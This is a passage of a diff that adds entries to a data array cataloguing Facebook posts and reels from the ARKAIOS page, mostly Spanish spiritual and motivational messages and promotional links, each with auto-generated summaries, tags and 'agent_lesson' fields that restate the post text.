+    "summary": "Se le llama pureza o como el genesis le dice:\n... y el Espíritu de Dios se movía sobre la faz de las aguas - Genesis 1:1, Tan poderoso como para contenerse, tan fuerte como para pesar millones de kilos y tan necesario para mantener la vida!\nque más pruebas quieres amigo??? \n1 TESALONICENSES 5:19-28 RVR1960",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Se le llama pureza o como el genesis le dice:\n... y el Espíritu de Dios se movía sobre la faz de las aguas - Genesis 1:1, Tan poderoso como para contenerse, tan fuerte como para pesar millones de kilos y tan necesario para mantener la vida!\nque más p...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122320578140206604&set=a.122229087992206604&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161793510989266",
+    "title": "El secreto de los millonarios que nadie nunca te dijo aqui te lo revelo:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1546932626798319&set=a.758084869016436&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1546932626798319&set=a.758084869016436&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1546932626798319&set=a.758084869016436&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "El secreto de los millonarios que nadie nunca te dijo aqui te lo revelo:\nSimplemente se cansaron de trabajar para alguien mas...!!!. 😁👌",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: El secreto de los millonarios que nadie nunca te dijo aqui te lo revelo:\nSimplemente se cansaron de trabajar para alguien mas...!!!. 😁👌...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1546932626798319&set=a.758084869016436&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161793330989266",
+    "title": "Aprende del mundo natural vive y deja vivir!",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1425415102966036&set=a.631906868983534&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1425415102966036&set=a.631906868983534&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1425415102966036&set=a.631906868983534&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Aprende del mundo natural vive y deja vivir!\nLa mision del ser humano en la tierra.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Aprende del mundo natural vive y deja vivir!\nLa mision del ser humano en la tierra....",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1425415102966036&set=a.631906868983534&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161793204989266",
+    "title": "Si lo más pequeño expuesto a su maxima potencia es visible en el mundo fisico que esperas tu pára sobresalir??? la ecuac",
+    "category": "Critical Infrastructure & Legacy Resilience",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1031423082742340&set=a.204427942108529&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1031423082742340&set=a.204427942108529&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1031423082742340&set=a.204427942108529&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Si lo más pequeño expuesto a su maxima potencia es visible en el mundo fisico que esperas tu pára sobresalir??? la ecuacion esta en ti!. y la respuesta amigo siempre estubo en tu interior unos le diran y llamaran: NUCLEO yo le llamo Chispa Divina, \"Espiritu/Dios\"...",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Si lo más pequeño expuesto a su maxima potencia es visible en el mundo fisico que esperas tu pára sobresalir??? la ecuacion esta en ti!. y la respuesta amigo siempre estubo en tu interior unos le diran y llamaran: NUCLEO yo le llamo Chispa Divina, \"E...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1031423082742340&set=a.204427942108529&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161793036989266",
+    "title": "Publicación Oficial ARKAIOS #122161793036989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1511311467456562&set=a.568740435047008&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1511311467456562&set=a.568740435047008&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1511311467456562&set=a.568740435047008&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1511311467456562&set=a.568740435047008&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161792034989266",
+    "title": "Excelente Aporte,,,",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4436140913379914/",
+    "canonical_url": "https://www.facebook.com/reel/4436140913379914/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4436140913379914/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Excelente Aporte,,,\nSolo para mentes despiertas!!!.\n\"https://youtu.be/b8s5z2x4sOA?si=NPoqkgNvlKhxeckY\"\n@Parafant%C3%A1stico\n// Proton Pass por un dólar: http://proton.me/pass/parafantastico",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4436140913379914/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4436140913379914/"
+  },
+  {
+    "id": "meta-776644758860856_122161790228989266",
+    "title": "Naturaleza amigo,,, todo responde a este principio llamado: \"Dios\"",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1035381302348794&set=a.184491924104407&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1035381302348794&set=a.184491924104407&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1035381302348794&set=a.184491924104407&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Naturaleza amigo,,, todo responde a este principio llamado: \"Dios\"",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Naturaleza amigo,,, todo responde a este principio llamado: \"Dios\"...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1035381302348794&set=a.184491924104407&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161790084989266",
+    "title": "Exacto!!!: y vamos por mas!!!.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/122178342368989266/posts/122161790084989266",
+    "canonical_url": "https://www.facebook.com/122178342368989266/posts/122161790084989266",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Exacto!!!: y vamos por mas!!!.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Exacto!!!: y vamos por mas!!!....",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/122178342368989266/posts/122161790084989266"
+  },
+  {
+    "id": "meta-776644758860856_122161789892989266",
+    "title": "Publicación Oficial ARKAIOS #122161789892989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122240953688123163&set=a.122108983070123163&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122240953688123163&set=a.122108983070123163&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122240953688123163&set=a.122108983070123163&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122240953688123163&set=a.122108983070123163&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161789814989266",
+    "title": "Publicación Oficial ARKAIOS #122161789814989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1504299275071212&set=a.643902181110930&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1504299275071212&set=a.643902181110930&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1504299275071212&set=a.643902181110930&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1504299275071212&set=a.643902181110930&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161789484989266",
+    "title": "Publicación Oficial ARKAIOS #122161789484989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1464306555733328&set=a.470437798453547&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1464306555733328&set=a.470437798453547&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1464306555733328&set=a.470437798453547&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1464306555733328&set=a.470437798453547&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161786682989266",
+    "title": "\"arkaios2025.base44.app\"",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2408819156262933/",
+    "canonical_url": "https://www.facebook.com/reel/2408819156262933/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2408819156262933/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "\"arkaios2025.base44.app\"\nPara los que nos visitaban en nuestro antiguo dominio les agradecemos su contacto y mensajes... \nGracias a esto les comentamos que nuevamente estamos activos,,,\n\nGracias por sus comentarios y seguir el ecosistema de cerca!!!.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2408819156262933/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2408819156262933/"
+  },
+  {
+    "id": "meta-776644758860856_122161770302989266",
+    "title": "Publicación Oficial ARKAIOS #122161770302989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1529475525426412&set=a.707440194296620&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1529475525426412&set=a.707440194296620&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1529475525426412&set=a.707440194296620&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1529475525426412&set=a.707440194296620&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161770230989266",
+    "title": "Publicación Oficial ARKAIOS #122161770230989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1433128211953502&set=a.525873369345662&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1433128211953502&set=a.525873369345662&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1433128211953502&set=a.525873369345662&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1433128211953502&set=a.525873369345662&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161769984989266",
+    "title": "Publicación Oficial ARKAIOS #122161769984989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1329479322731509&set=a.467973455548771&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1329479322731509&set=a.467973455548771&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1329479322731509&set=a.467973455548771&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1329479322731509&set=a.467973455548771&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161769576989266",
+    "title": "Publicación Oficial ARKAIOS #122161769576989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1581394710661422&set=a.444122014388703&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1581394710661422&set=a.444122014388703&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1581394710661422&set=a.444122014388703&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1581394710661422&set=a.444122014388703&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161698782989266",
+    "title": "Publicación Oficial ARKAIOS #122161698782989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1329760476036727&set=a.467973455548771&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1329760476036727&set=a.467973455548771&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1329760476036727&set=a.467973455548771&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1329760476036727&set=a.467973455548771&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161616624989266",
+    "title": "Publicación Oficial ARKAIOS #122161616624989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1517448326743894&set=a.1126437475844983&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1517448326743894&set=a.1126437475844983&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1517448326743894&set=a.1126437475844983&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1517448326743894&set=a.1126437475844983&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161616456989266",
+    "title": "Publicación Oficial ARKAIOS #122161616456989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1529935645380400&set=a.707440194296620&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1529935645380400&set=a.707440194296620&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1529935645380400&set=a.707440194296620&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1529935645380400&set=a.707440194296620&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161616396989266",
+    "title": "Publicación Oficial ARKAIOS #122161616396989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122115772989277123&set=a.122097454125277123&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122115772989277123&set=a.122097454125277123&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122115772989277123&set=a.122097454125277123&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122115772989277123&set=a.122097454125277123&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161389104989266",
+    "title": "Publicación Oficial ARKAIOS #122161389104989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1551938560279954&set=a.485783733562114&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1551938560279954&set=a.485783733562114&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1551938560279954&set=a.485783733562114&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1551938560279954&set=a.485783733562114&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161388810989266",
+    "title": "Publicación Oficial ARKAIOS #122161388810989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1018925013816182&set=a.194713536237338&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1018925013816182&set=a.194713536237338&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1018925013816182&set=a.194713536237338&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1018925013816182&set=a.194713536237338&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161360838989266",
+    "title": "Publicación Oficial ARKAIOS #122161360838989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1306055511677697&set=a.486758520274071&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1306055511677697&set=a.486758520274071&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1306055511677697&set=a.486758520274071&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1306055511677697&set=a.486758520274071&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161289546989266",
+    "title": "Visita nuestro ecosistema y conócenos!!!.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122161289474989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122161289474989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122161289474989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Visita nuestro ecosistema y conócenos!!!.\nhttps://arkaios.dpdns.org/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Visita nuestro ecosistema y conócenos!!!.\nhttps://arkaios.dpdns.org/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122161289474989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122160799100989266",
+    "title": "https://dash.domain.digitalplat.org/signup?ref=926UIRgFAm",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/994889543185184/",
+    "canonical_url": "https://www.facebook.com/reel/994889543185184/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/994889543185184/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://dash.domain.digitalplat.org/signup?ref=926UIRgFAm",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/994889543185184/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/994889543185184/"
+  },
+  {
+    "id": "meta-776644758860856_122160797324989266",
+    "title": "Publicación Oficial ARKAIOS #122160797324989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1633856205413297&set=a.451238043675125&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1633856205413297&set=a.451238043675125&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1633856205413297&set=a.451238043675125&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1633856205413297&set=a.451238043675125&type=3"
   }
 ];
 
